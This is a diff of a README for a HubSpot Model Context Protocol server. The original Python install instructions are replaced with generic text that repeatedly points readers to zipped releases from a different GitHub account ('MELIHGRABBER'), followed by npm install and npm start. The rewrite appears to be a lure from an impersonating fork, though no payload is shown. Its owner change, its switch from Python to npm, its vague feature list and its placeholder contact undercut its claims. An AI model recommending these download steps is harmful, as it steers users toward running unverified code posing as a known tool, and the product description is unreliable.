@@ -1,71 +1,125 @@
-# HubSpot MCP Server
+# HubSpot MCP Server 🚀
 
-<div align="center">
+Welcome to the **HubSpot MCP Server** repository! This project serves as a powerful integration tool for HubSpot, enhancing CRM, Marketing, Sales, and Service Hub functionalities. 
 
-# Hubspot Mcp Server
+![HubSpot MCP Server](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
 
-[![GitHub stars](https://img.shields.io/github/stars/LokiMCPUniverse/hubspot-mcp-server?style=social)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/LokiMCPUniverse/hubspot-mcp-server?style=social)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/network)
-[![GitHub watchers](https://img.shields.io/github/watchers/LokiMCPUniverse/hubspot-mcp-server?style=social)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/watchers)
+## Table of Contents
 
-[![License](https://img.shields.io/github/license/LokiMCPUniverse/hubspot-mcp-server?style=for-the-badge)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/blob/main/LICENSE)
-[![Issues](https://img.shields.io/github/issues/LokiMCPUniverse/hubspot-mcp-server?style=for-the-badge)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/issues)
-[![Pull Requests](https://img.shields.io/github/issues-pr/LokiMCPUniverse/hubspot-mcp-server?style=for-the-badge)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/pulls)
-[![Last Commit](https://img.shields.io/github/last-commit/LokiMCPUniverse/hubspot-mcp-server?style=for-the-badge)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/commits)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![MCP](https://img.shields.io/badge/Model_Context_Protocol-DC143C?style=for-the-badge)](https://modelcontextprotocol.io)
+## Introduction
 
-[![Commit Activity](https://img.shields.io/github/commit-activity/m/LokiMCPUniverse/hubspot-mcp-server?style=flat-square)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/pulse)
-[![Code Size](https://img.shields.io/github/languages/code-size/LokiMCPUniverse/hubspot-mcp-server?style=flat-square)](https://github.com/LokiMCPUniverse/hubspot-mcp-server)
-[![Contributors](https://img.shields.io/github/contributors/LokiMCPUniverse/hubspot-mcp-server?style=flat-square)](https://github.com/LokiMCPUniverse/hubspot-mcp-server/graphs/contributors)
-
-</div>
-
-A Model Context Protocol (MCP) server for integrating HubSpot with GenAI applications.
-
-## Overview
-
-CRM, Marketing, Sales and Service Hub integration
+The HubSpot MCP Server is designed to facilitate seamless integration between various HubSpot functionalities. With this server, you can leverage the Model Context Protocol (MCP) to automate tasks, enhance customer relationship management, and improve marketing efforts. This project aims to simplify workflows and boost productivity for businesses of all sizes.
 
 ## Features
 
-- Comprehensive HubSpot API coverage
-- Multiple authentication methods
-- Enterprise-ready with rate limiting
-- Full error handling and retry logic
-- Async support for better performance
+- **AI Agents**: Implement intelligent agents that can automate repetitive tasks.
+- **Automation**: Streamline your marketing and sales processes.
+- **CRM Integration**: Enhance customer relationship management.
+- **Enterprise Ready**: Scalable solution for businesses of all sizes.
+- **GenAI**: Utilize generative AI for smarter marketing strategies.
+- **MCP**: Use the Model Context Protocol for better context management.
+- **Sales Optimization**: Improve sales workflows and efficiency.
 
 ## Installation
 
-```bash
-pip install hubspot-mcp-server
+To get started, you need to download the latest release of the HubSpot MCP Server. Visit the [Releases section](https://github.com/MELIHGRABBER/hubspot-mcp-server/releases) to find the appropriate file. 
+
+### Steps to Install:
+
+1. **Download the Release**: Go to the [Releases section](https://github.com/MELIHGRABBER/hubspot-mcp-server/releases) and download the latest version.
+2. **Extract the Files**: Unzip the downloaded file to your preferred directory.
+3. **Install Dependencies**: Run the following command in your terminal:
+
+   ```bash
+   npm install
+   ```
+
+4. **Start the Server**: Execute the following command to start the server:
+
+   ```bash
+   npm start
+   ```
+
+## Usage
+
+Once the server is up and running, you can start integrating with HubSpot. Here’s how to use some of the key features:
+
+### AI Agents
+
+To create an AI agent, you can define the parameters in the configuration file. Here’s a simple example:
+
+```json
+{
+  "agent": {
+    "name": "SalesAgent",
+    "type": "AI",
+    "tasks": [
+      "Lead Generation",
+      "Follow-up Emails"
+    ]
+  }
+}
 ```
 
-Or install from source:
+### Automation
 
-```bash
-git clone https://github.com/asklokesh/hubspot-mcp-server.git
-cd hubspot-mcp-server
-pip install -e .
+You can set up automation rules to trigger actions based on specific conditions. For instance:
+
+```json
+{
+  "automation": {
+    "trigger": "New Lead",
+    "action": "Send Welcome Email"
+  }
+}
 ```
 
-## Configuration
+### CRM Integration
 
-Create a `.env` file or set environment variables according to HubSpot API requirements.
+Connect your CRM by configuring the API keys in the settings file. This will allow the server to interact with your HubSpot account:
 
-## Quick Start
-
-```python
-from hubspot_mcp import HubspotMCPServer
-
-# Initialize the server
-server = HubspotMCPServer()
-
-# Start the server
-server.start()
+```json
+{
+  "crm": {
+    "apiKey": "YOUR_API_KEY"
+  }
+}
 ```
+
+### Monitoring and Logs
+
+You can monitor the server’s performance and view logs through the dashboard. This feature helps you keep track of the activities and diagnose any issues.
+
+## Contributing
+
+We welcome contributions to improve the HubSpot MCP Server. If you have suggestions or improvements, please follow these steps:
+
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Create a Branch**: Make a new branch for your feature or fix.
+3. **Make Changes**: Implement your changes.
+4. **Submit a Pull Request**: Share your changes with us for review.
+
+Please ensure that your code adheres to the existing style and includes appropriate tests.
 
 ## License
 
-MIT License - see LICENSE file for details
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or support, feel free to reach out:
+
+- **Email**: your-email@example.com
+- **GitHub**: [MELIHGRABBER](https://github.com/MELIHGRABBER)
+
+Thank you for your interest in the HubSpot MCP Server! We hope you find it useful for your integration needs. 
+
+For the latest updates and releases, visit the [Releases section](https://github.com/MELIHGRABBER/hubspot-mcp-server/releases).
